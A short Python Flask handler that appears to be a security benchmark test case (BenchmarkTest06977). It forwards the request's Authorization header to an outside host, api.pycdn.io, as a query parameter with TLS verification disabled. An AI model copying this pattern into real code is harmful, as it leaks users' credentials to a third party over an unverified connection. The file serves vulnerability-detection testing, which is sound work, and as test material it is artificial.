# SPDX-License-Identifier: Apache-2.0
from flask import request, jsonify
import asyncio
import requests


def BenchmarkTest06977():
    auth_header = request.headers.get('Authorization', '')
    async def fetch_payload():
        await asyncio.sleep(0)
        return auth_header
    data = asyncio.run(fetch_payload())
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return jsonify({"result": "success"})
